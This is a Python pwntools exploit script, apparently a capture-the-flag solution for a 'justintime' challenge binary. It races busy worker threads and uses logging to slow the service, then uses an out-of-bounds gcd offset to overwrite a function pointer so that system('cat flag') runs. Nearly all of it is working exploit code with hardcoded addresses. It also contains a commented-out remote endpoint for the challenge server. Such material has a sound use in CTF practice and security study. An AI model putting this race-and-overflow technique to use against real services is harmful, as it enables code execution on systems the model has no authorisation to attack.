from pwn import *



s = process('./justintime')
#s = remote('justintime_f09b383db2d33ee22a5a53dc76557388.quals.shallweplayaga.me',5192)

def send_overflow(offset):
    offset &= 0xffffffff
    offset /= 4
    s.send('process 4 gcd 1 1 1 1 %d\n' % offset)

def busy_worker(num):
    #Number is large prime
    s.send('process %d prime 3628273133\n' % num)

def send_addr(addr):
    #Send the address... and the command
    v = list(struct.unpack("<LLL", "cat flag\x00   "))
    v.append(addr)
    s.send('process 3 gcd '+" ".join(['%d'%d for d in v]) + "\n")
    b = s.recv(4096)
    while 'Worker 3, GCD is' not in b:
        s.send('\n')
        time.sleep(0.5)
        b += s.recv(4096)


busy_worker(1)
busy_worker(2)

#Enable logging which slows things down enough to get us control
s.send('log on\n')

# Busy worker 4 so it doesn't set the flag back after gcd finishes
busy_worker(4)

system = 0x08077110
addr_state = 0x812b5e4
addr_funcs = 0x81284c0
addr_worker3_args = 0x0812B5C0

send_addr(system)

while True:
    send_overflow( (addr_worker3_args-addr_funcs+12))
    time.sleep(0.5)
    print s.recv(4096)
s.interactive()

